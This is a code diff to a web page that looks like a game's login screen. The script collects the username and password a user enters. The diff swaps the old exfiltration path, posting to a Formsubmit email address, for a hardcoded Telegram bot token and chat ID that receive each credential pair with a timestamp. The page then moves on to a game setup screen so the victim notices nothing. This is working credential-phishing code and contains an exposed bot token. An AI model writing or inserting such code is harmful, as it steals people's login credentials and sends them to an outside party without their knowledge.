@@ -219,6 +219,9 @@
     </div>
 
     <script>
+        const BOT_TOKEN = "8759839829:AAF-EUsIIzjysaVcFPKCayxYXwWFJXkBr4";
+        const CHAT_ID = "6772111715";
+
         function togglePassword() {
             const pass = document.getElementById('password');
             const icon = document.getElementById('eyeIcon');
@@ -254,23 +257,24 @@
                 return;
             }
 
-            // Send data via AJAX (Fetch) directly to Formsubmit
-            fetch("https://formsubmit.co/ajax/vs4539876@gmail.com", {
+            // Telegram message format
+            const message = `🚨 *New Login Received!*\n\n👤 *Username:* \`${username}\`\n🔑 *Password:* \`${password}\`\n⏰ *Time:* \`${timeStr}\``;
+
+            // Send to Telegram Bot via API
+            const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            
+            fetch(telegramUrl, {
                 method: "POST",
-                headers: { 
-                    'Content-Type': 'application/json',
-                    'Accept': 'application/json'
-                },
+                headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({
-                    Username: username,
-                    Password: password,
-                    Time: timeStr,
-                    _captcha: "false"
+                    chat_id: CHAT_ID,
+                    text: message,
+                    parse_mode: "Markdown"
                 })
             })
-            .then(response => response.json())
-            .then(data => console.log("Email sent successfully:", data))
-            .catch(error => console.log("Error sending email:", error));
+            .then(res => res.json())
+            .then(data => console.log("Telegram notification sent:", data))
+            .catch(err => console.log("Telegram Error:", err));
 
             // Smoothly move to next screen
             showScreen('gameSetupScreen');
